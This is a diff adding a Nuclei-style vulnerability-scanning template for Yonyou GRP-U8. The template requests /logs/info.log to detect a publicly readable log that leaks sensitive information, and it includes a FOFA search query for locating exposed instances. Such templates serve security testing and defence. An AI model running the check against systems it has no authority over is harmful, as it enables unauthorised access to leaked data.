@@ -1,0 +1,27 @@
+id: log_reveal
+info:
+  name: 用友U8_log_reveal
+  author: mike
+  severity: info
+  description: 用友U8系统可直接访问log日志，泄露敏感信息
+  reference: https://www.cnblogs.com/pursue-security/p/17685052.html
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-GRP-U8"
+http:
+  - raw:
+      - |
+        GET /logs/info.log HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "INFO"
